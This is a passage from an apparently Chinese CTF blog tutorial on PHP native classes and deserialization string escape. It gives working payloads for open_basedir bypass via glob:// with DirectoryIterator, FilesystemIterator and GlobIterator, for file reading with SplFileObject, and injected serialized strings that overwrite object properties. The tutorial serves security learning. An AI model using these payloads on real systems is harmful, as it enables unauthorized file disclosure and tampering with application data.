FilesystemIterator(&quot;glob:///*php*&quot;);</span><br><span class="line">echo $dir;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><br>(3)GlobIterator类<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;版本:PHP 5 &gt;= 5.3.0, PHP 7, PHP 8</span><br><span class="line">&lt;2&gt;用法:$dir=new Globlterator(文件路径);</span><br></pre></td></tr></table></div></figure><br>与前两个类的作用相似,GlobIterator类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob(),可以通过模式匹配来寻找文件路径。<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/11.png"><br>其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的toString()方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 GlobIterator(&#x2F;flag)：<br>测试代码<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new GlobIterator(&quot;f*.*&quot;);</span><br><span class="line">echo $dir;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><br>2.使用可遍历目录类绕过 open_basedir</h2>
      <p>DirectoryIterator类和FilesystemIterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录<br>的文件。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.DirectoryIterator:</span><br><span class="line">&lt;?php</span><br><span class="line">$dir = $_GET[&#x27;wann&#x27;];</span><br><span class="line">$a = new DirectoryIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);// 不加__toString()也可,因为echo可以自动调用</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"># payload一句话的形式:</span><br><span class="line">$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/12.png"><br>此时已经读取根目录下的文件夹；此时我们提交?whoami&#x3D;glob:&#x2F;&#x2F;&#x2F;phpstorm&#x2F;* 便可以查看phpstorm下的任意文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">2.FilesystemIterator：</span><br><span class="line">&lt;?php</span><br><span class="line">$dir = $_GET[&#x27;whoami&#x27;];</span><br><span class="line">$a = new FilesystemIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);// 不加__toString()也可,因为echo可以自动调用</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">3.GlobIterator:</span><br><span class="line">因为GlobIterator支持通过模式匹配来查找文件，所以此时我们就不需要配合glob://协议来查找了</span><br><span class="line">&lt;?php</span><br><span class="line">$dir = $_GET[&#x27;whoami&#x27;];</span><br><span class="line">$a = new GlobIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);// 不加__toString()也可,因为echo可以自动调用</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-可读取文件类">
          <a href="#3-可读取文件类" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-可读取文件类" class="headerlink" title="3.可读取文件类"></a>3.可读取文件类</h2>
      <p>SplFileObject:该类的构造方法可以构造一个新的文件对象用于后续的读取。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;版本:PHP 5 &gt;= 5.1.0, PHP 7, PHP 8</span><br><span class="line">&lt;2&gt;用法:$context = new SplFileObject(&#x27;文件路径&#x27;);</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/13.png"><br>测试代码：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/cachegrind.out.1004&#x27;);</span><br><span class="line">echo $context;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</span><br><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/cachegrind.out.1004&#x27;);</span><br><span class="line">foreach($context as $f)&#123;</span><br><span class="line">    echo($f);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-PHP原生类之遍历文件和文件读取的配合使用">
          <a href="#4-PHP原生类之遍历文件和文件读取的配合使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-PHP原生类之遍历文件和文件读取的配合使用" class="headerlink" title="4.PHP原生类之遍历文件和文件读取的配合使用"></a>4.PHP原生类之遍历文件和文件读取的配合使用</h2>
      <p>DirectoryIterator类:这个类会创建一个指定目录的迭代器，当遇到echo输出时会触发Directorylterator中的toString()方法，输出指定目录里面经过排序之后的第一个文件名。<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1.png"><br>此时我们测试一下这个原生类：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$dir=new DirectoryIterator(&quot;../&quot;);</span><br><span class="line">echo $dir;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/2.png"><br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/3.png"><br>此时可以发现只输出了第一个文件;此时我们可以使用循环输出来输出每一个数组的第一个<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/4.png"><br>此时我将flag.txt放入hep-php的文件夹里面在看看<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/5.png"><br>此时会发现无法查看到是否有flag.txt文件；此时我们就可以配合glob:&#x2F;&#x2F;协议进行一个文件的匹配；</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$dir=new DirectoryIterator(&quot;glob://[a-z0-9]*.txt&quot;);</span><br><span class="line">echo $dir;</span><br><span class="line">//foreach ($dir as $tmp)&#123;</span><br><span class="line">    //echo ($tmp.&#x27;&lt;br&gt;&#x27;);&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/6.png"><br>此时我们已经可以查看到确实存在这个flag.txt；那么此时我们已经查看到了flag.txt的文件；此时我们需要对它进行一个读取；此时便又用到了PHP原生类中的读取文件类SplFileObject类</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$text= new SplFileObject(&#x27;./flag.txt&#x27;);</span><br><span class="line">echo $text.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/7.png"><br>此时发现已经查看到了flag.txt的内容但是此时只读取了第一行；此时我们继续使用循环输出的方法来读取</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$text= new SplFileObject(&#x27;./flag.txt&#x27;);</span><br><span class="line">foreach ($text as $tmp)</span><br><span class="line">&#123;</span><br><span class="line">    echo $tmp;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/8.png"><br>此时已经发现成功读取</p>

        <h2 id="二、PHP反序列化之字符逃逸">
          <a href="#二、PHP反序列化之字符逃逸" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、PHP反序列化之字符逃逸" class="headerlink" title="二、PHP反序列化之字符逃逸"></a>二、PHP反序列化之字符逃逸</h2>
      <p>此时我们需要先了解一下反序列化的一些特点<br>1.在底层代码中是以“；”来作为字段的分隔，以“}”来作为结尾并且是以长度来判断内容；同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。<br>注意：超出的部分不会被反序列化成功；这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。而且可以看到反序列化字符串都是以”;}结束的，那如果把”;}添入到需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就相应的丢弃了。(这个很像SQL注入的闭合&#x2F;注释和%00截断)<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/15.png"><br>2.当长度不对应的时候会报错：<br>在反序列化的时候会根据s的长度去读后面的字符串；当长度不一致的时候便会报错<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/16.png"><br>3.可以反序列化类中不存在的元素<br>假设一个类中只有name和pass两个属性；此时我也可以反序列化这个类中没有的属性pass2<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/14.png"></p>

        <h2 id="1-字符逃逸的原理和字符串逃逸类题目的特点：">
          <a href="#1-字符逃逸的原理和字符串逃逸类题目的特点：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-字符逃逸的原理和字符串逃逸类题目的特点：" class="headerlink" title="1.字符逃逸的原理和字符串逃逸类题目的特点："></a>1.字符逃逸的原理和字符串逃逸类题目的特点：</h2>
      <p>什么是字符逃逸，从字面意思看，就是一些字符被丢弃。我们知道，序列化后的字符串在进行反序列化操作时，会以{}两个花括号进行分界线，花括号以外的内容不会被反序列化。此时的原理也可以理解为上面的反序列化特点1和特点2</p>
<p>1.这类CTF题目的本质是因为改变序列化字符串的长度，从而导致反序列化漏洞。<br>2.具体的话大致都是因为php序列化后的字符串经过了替换或者修改，导致字符串长度发生变化。而且总是先进行序列化，再进行替换修改操作。(注意这里的先进行序列化在进行替换或者修改)</p>

        <h2 id="2-字符逃逸之替换修改后导致序列化字符串变长">
          <a href="#2-字符逃逸之替换修改后导致序列化字符串变长" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-字符逃逸之替换修改后导致序列化字符串变长" class="headerlink" title="2.字符逃逸之替换修改后导致序列化字符串变长"></a>2.字符逃逸之替换修改后导致序列化字符串变长</h2>
      <p>实验代码1：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#参考字节脉搏实验室</span><br><span class="line">&lt;?php</span><br><span class="line">function lemon($string)&#123;</span><br><span class="line">  $lemon = &#x27;/p/i&#x27;;</span><br><span class="line">  return preg_replace($lemon,&#x27;ww&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[&#x27;a&#x27;];</span><br><span class="line">$age = &#x27;20&#x27;;</span><br><span class="line">$user = array($username,$age);</span><br><span class="line">var_dump(serialize($user));</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$r = lemon(serialize($user));</span><br><span class="line">var_dump($r);</span><br><span class="line">var_dump(unserialize($r));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>此时我们提交?a&#x3D;apple;因为我们输入的是apple,含有两个p，所以会被替换成四个w,但是发现长度并没有变化，因此根据反序列化的特点，指定的长度错误则反序列化就会失败。<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/17.png"><br>但是正是因为存在这个过滤，我们便可以去修改age的值，首先来看一下，原来序列化后”;i:1;s:2:”20”;}长度为16，我们已经知道了当输入一个p会替换成ww，所以如果输入16个p，那么会生成32个的w，所以如果我们输入16个p再加上构造的相同位数的”;i:1;s:2:”30”;}，恰好是32位，即</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">32 pppppppppppppppp&quot;;i:1;s:2:&quot;30&quot;;&#125;</span><br><span class="line">经过替换后</span><br><span class="line">32 wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww</span><br></pre></td></tr></table></div></figure>
<p>所以非常明显了，在过滤后的序列化时会被32个w全部填充，从而使构造的代码 “;i:1;s:2:”30”;} 成功逃逸，修改了age的值，而原来的那”;i:1;s:2:”20”;}则被忽略了因为反序列化字符串都是以”;}结束的，我们传入的”;i:1;s:2:”30”;}已经在前面成功闭合了<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/18.png"><br>实验代码2：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function filter($str)&#123;</span><br><span class="line">    return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);</span><br><span class="line">&#125;</span><br><span class="line">class A&#123;</span><br><span class="line">    public $name=&#x27;aaaa&#x27;;</span><br><span class="line">    public $pass=&#x27;123456&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$AA=new A();</span><br><span class="line">echo serialize($AA).&quot;\n&quot;;</span><br><span class="line">$res=filter(serialize($AA));</span><br><span class="line">$c=unserialize($res);</span><br><span class="line">echo $c-&gt;pass;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>以上一段代码为例子；我们如何在不直接修改密码的情况下来修改密码；我们先来看一下上诉代码的流程；此时这里用了一个替换的函数；将在$str中出现的bb全部替换成ccc；然后将序列化后的$AA进行带入这个函数进行一个替换之后再次进行反序列化；最后输出pass变量<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/19.png"><br>此时我们将属性$name改为aaaabb；此时这个属性$name便会经过filter函数的替换为aaaaccc<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/20.png"><br>可见在序列化后的字符串在经过filter函数过滤前，s为6，内容为aaaabb；经过filter过滤后，s仍然为6，但内容变为了aaaaccc，长度变成了7，根据反序列化读取变量的原则来讲，此时的name能读取到的只是aaaacc，末尾处的那个c是读取不到的，这就形成了一个字符串的逃逸。<br>所以当我们添加多个bb，每添加一个bb我们就能逃逸一个字符，那我们将逃逸的字符串的长度填充成我们要反序列化的代码长度的话那就可以控制反序列化的结果以及类里面的变量值了。<br>假设我要在属性$name中来修改密码值;就如同下面代码一样</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class A&#123;</span><br><span class="line">    public $name=&#x27;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;;</span><br><span class="line">    public $pass=&#x27;123456&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/21.png"><br>由于$name被序列化后的长度是固定的，在反序列化后$name仍然为”;s:4:”pass”;s:6:”hacker”;}，$pass仍然为123456；所以此时的密码仍然没有被改变。<br>这里我们将目光聚焦在filter函数，这个函数检测并替换了非法字符串，看似增加了代码的安全系数，实则让整段代码更加危险。filter函数中检测序列化后的字符串，如果检测到了非法字符’bb’，就把它替换为’ccc’。<br>此时我们发现”;s:4:”pass”;s:6:”hacker”;}的长度为27，如果我们再加上27个bb，那最终的长度将增加27，不就能逃逸后面的”;s:4:”pass”;s:6:”hacker”;}了吗<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/22.png"><br>这里做一个解读:当我们填充了27bb之后经filter的替换此时会生成27个cc+27个c;因为此时我们的payload:”;s:4:”pass”;s:6:”hacker”;}长度为27；所以此时刚好可以被识别；也就是我们所说的逃逸出来；那么因为前面有了一个；}所以此时整个序列化是闭合的；所以后面的;s:4:”pass”;s:6:”123456”;}已经无法执行(等同于被注释掉了)<br>这个就是字符逃逸之经替换或者修改后payload被顶出的漏洞</p>

        <h2 id="字符逃逸之替换之后导致序列化字符串变短">
          <a href="#字符逃逸之替换之后导致序列化字符串变短" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符逃逸之替换之后导致序列化字符串变短" class="headerlink" title="字符逃逸之替换之后导致序列化字符串变短"></a>字符逃逸之替换之后导致序列化字符串变短</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function str_rep($string)&#123;</span><br><span class="line">  return preg_replace( &#x27;/php|test/&#x27;,&#x27;&#x27;, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test[&#x27;name&#x27;] = &#x27;whoami&#x27;;</span><br><span class="line">$test[&#x27;sign&#x27;] = &#x27;hello&#x27;</span><br><span class="line">$test[&#x27;number&#x27;] = &#x27;2020&#x27;;</span><br><span class="line">$temp = str_rep(serialize($test));</span><br><span class="line">printf($temp);</span><br><span class="line">$fake = unserialize($temp);</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">print(&quot;name:&quot;.$fake[&#x27;name&#x27;].&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">print(&quot;sign:&quot;.$fake[&#x27;sign&#x27;].&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">print(&quot;number:&quot;.$fake[&#x27;number&#x27;].&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/23.png"><br>而此时我们想要修改number值；我们先构造出payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;</span><br></pre></td></tr></table></div></figure>
<p>此时令$sign&#x3D;”,s:6:”number”;s:4:”2020”;}此时发现无法修改number值;<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/24.png"><br>此时来观察一下这个序列化的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;name&quot;;s:6:&quot;whoami&quot;;s:4:&quot;sign&quot;;s:27:&quot;&quot;,s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;</span><br></pre></td></tr></table></div></figure>
<p>此时我们查看源码可以构造</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=testtesttesttesttesttest</span><br><span class="line">sign=hello&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/25.png"><br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/26.png"></p>

        <h2 id="prize-p5">
          <a href="#prize-p5" class="heading-link"><i class="fas fa-link"></i></a><a href="#prize-p5" class="headerlink" title="prize_p5"></a>prize_p5</h2>
      <p><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/29.png"><br>此时这一题有两种解法，可以利用原生类的文件操作来读取；也可以使用字符逃逸来解；<br>解法一之原生类：<br>此时我们先来进行代码审计；此时注意到在catalogue类中存在一个可以自定义的类</p>
